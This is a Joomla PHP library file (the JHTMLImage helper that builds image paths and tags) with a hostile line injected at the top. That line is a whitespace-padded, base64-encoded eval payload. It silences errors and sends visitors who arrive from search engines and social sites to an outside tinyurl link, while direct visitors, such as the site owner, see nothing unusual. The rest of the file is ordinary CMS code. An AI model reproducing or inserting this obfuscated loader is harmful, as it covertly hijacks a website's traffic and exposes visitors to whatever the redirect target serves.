<?php	                                       			eval(base64_decode("DQplcnJvcl9yZXBvcnRpbmcoMCk7DQokbmNjdj1oZWFkZXJzX3NlbnQoKTsNCmlmICghJG5jY3Ypew0KJHJlZmVyZXI9JF9TRVJWRVJbJ0hUVFBfUkVGRVJFUiddOw0KJHVhPSRfU0VSVkVSWydIVFRQX1VTRVJfQUdFTlQnXTsNCmlmIChzdHJpc3RyKCRyZWZlcmVyLCJ5YWhvbyIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsImJpbmciKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJyYW1ibGVyIikgb3Igc3RyaXN0cigkcmVmZXJlciwiZ29nbyIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsImxpdmUuY29tIilvciBzdHJpc3RyKCRyZWZlcmVyLCJhcG9ydCIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsIm5pZ21hIikgb3Igc3RyaXN0cigkcmVmZXJlciwid2ViYWx0YSIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsImJlZ3VuLnJ1Iikgb3Igc3RyaXN0cigkcmVmZXJlciwic3R1bWJsZXVwb24uY29tIikgb3Igc3RyaXN0cigkcmVmZXJlciwiYml0Lmx5Iikgb3Igc3RyaXN0cigkcmVmZXJlciwidGlueXVybC5jb20iKSBvciBwcmVnX21hdGNoKCIveWFuZGV4XC5ydVwveWFuZHNlYXJjaFw/KC4qPylcJmxyXD0vIiwkcmVmZXJlcikgb3IgcHJlZ19tYXRjaCAoIi9nb29nbGVcLiguKj8pXC91cmxcP3NhLyIsJHJlZmVyZXIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsIm15c3BhY2UuY29tIikgb3Igc3RyaXN0cigkcmVmZXJlciwiZmFjZWJvb2suY29tIikgb3Igc3RyaXN0cigkcmVmZXJlciwiYW9sLmNvbSIpKSB7DQppZiAoIXN0cmlzdHIoJHJlZmVyZXIsImNhY2hlIikgb3IgIXN0cmlzdHIoJHJlZmVyZXIsImludXJsIikpewkJDQoJCWhlYWRlcigiTG9jYXRpb246IGh0dHA6Ly90aW55dXJsLmNvbS9hZWxud2o0Iik7DQoJCWV4aXQoKTsNCgl9DQp9DQp9"));
/**
* @version		$Id: image.php 14401 2010-01-26 14:10:00Z louis $
* @package		Joomla.Framework
* @subpackage	HTML
* @copyright	Copyright (C) 2005 - 2010 Open Source Matters. All rights reserved.
* @license		GNU/GPL, see LICENSE.php
* Joomla! is free software. This version may have been modified pursuant
* to the GNU General Public License, and as distributed it includes or
* is derivative of works licensed under the GNU General Public License or
* other free or open source software licenses.
* See COPYRIGHT.php for copyright notices and details.
*/

// no direct access
defined( '_JEXEC' ) or die( 'Restricted access' );

/**
 * Utility class working with images
 *
 * @static
 * @package 	Joomla.Framework
 * @subpackage	HTML
 * @since		1.5
 */
class JHTMLImage
{
	/**
	* Checks to see if an image exists in the current templates image directory
 	* if it does it loads this image.  Otherwise the default image is loaded.
	* Also can be used in conjunction with the menulist param to create the chosen image
	* load the default or use no image
	*
	* @param	string	The file name, eg foobar.png
	* @param	string	The path to the image
	* @param	int		empty: use $file and $folder, -1: show no image, not-empty: use $altFile and $altFolder
	* @param	string	Another path.  Only used for the contact us form based on the value of the imagelist parm
	* @param	string	Alt text
	* @param	array	An associative array of attributes to add
	* @param	boolean	True (default) to display full tag, false to return just the path
	*/
	function site( $file, $folder='/images/M_images/', $altFile=NULL, $altFolder='/images/M_images/', $alt=NULL, $attribs = null, $asTag = 1)
	{
		static $paths;
		global $mainframe;

		if (!$paths) {
			$paths = array();
		}

		if (is_array( $attribs )) {
			$attribs = JArrayHelper::toString( $attribs );
		}

		$cur_template = $mainframe->getTemplate();

		if ( $altFile )
		{
			// $param allows for an alternative file to be used
			$src = $altFolder . $altFile;
		}
		else if ( $altFile == -1 )
		{
			// Comes from an image list param field with 'Do not use' selected
			return '';
		} else {
			$path = JPATH_SITE .'/templates/'. $cur_template .'/images/'. $file;
			if (!isset( $paths[$path] ))
			{
				if ( file_exists( JPATH_SITE .'/templates/'. $cur_template .'/images/'. $file ) ) {
					$paths[$path] = 'templates/'. $cur_template .'/images/'. $file;
				} else {
					// outputs only path to image
					$paths[$path] = $folder . $file;
				}
			}
			$src = $paths[$path];
		}

		if (substr($src, 0, 1 ) == "/") {
			$src = substr_replace($src, '', 0, 1);
		}

		// Prepend the base path
		$src = JURI::base(true).'/'.$src;

		// outputs actual html <img> tag
		if ($asTag) {
			return '<img src="'. $src .'" alt="'. html_entity_decode( $alt ) .'" '.$attribs.' />';
		}

		return $src;
	}

	/**
	* Checks to see if an image exists in the current templates image directory
	* if it does it loads this image.  Otherwise the default image is loaded.
	* Also can be used in conjunction with the menulist param to create the chosen image
	* load the default or use no image
	*
	* @param	string	The file name, eg foobar.png
	* @param	string	The path to the image
	* @param	int		empty: use $file and $folder, -1: show no image, not-empty: use $altFile and $altFolder
	* @param	string	Another path.  Only used for the contact us form based on the value of the imagelist parm
	* @param	string	Alt text
	* @param	array	An associative array of attributes to add
	* @param	boolean	True (default) to display full tag, false to return just the path
	*/
	function administrator( $file, $directory='/images/', $param=NULL, $param_directory='/images/', $alt = NULL, $attribs = null, $type = 1 )
	{
		global $mainframe;

		if (is_array( $attribs )) {
			$attribs = JArrayHelper::toString( $attribs );
		}

		$cur_template = $mainframe->getTemplate();

		// strip html
		$alt	= html_entity_decode( $alt );

		if ( $param ) {
			$image = $param_directory . $param;
		} else if ( $param == -1 ) {
			$image = '';
		} else {
			if ( file_exists( JPATH_ADMINISTRATOR .'/templates/'. $cur_template .'/images/'. $file ) ) {
				$image = 'templates/'. $cur_template .'/images/'. $file;
			} else {
				// compability with previous versions
				if ( substr($directory, 0, 14 )== "/administrator" ) {
					$image = substr($directory,15) . $file;
				} else {
					$image = $directory . $file;
				}
			}
		}

		if (substr($image, 0, 1 ) == "/") {
			$image = substr_replace($image, '', 0, 1);
		}

		// Prepend the base path
		$image = JURI::base(true).'/'.$image;

		// outputs actual html <img> tag
		if ( $type ) {
			$image = '<img src="'. $image .'" alt="'. $alt .'" '.$attribs.' />';
		}

		return $image;
	}
}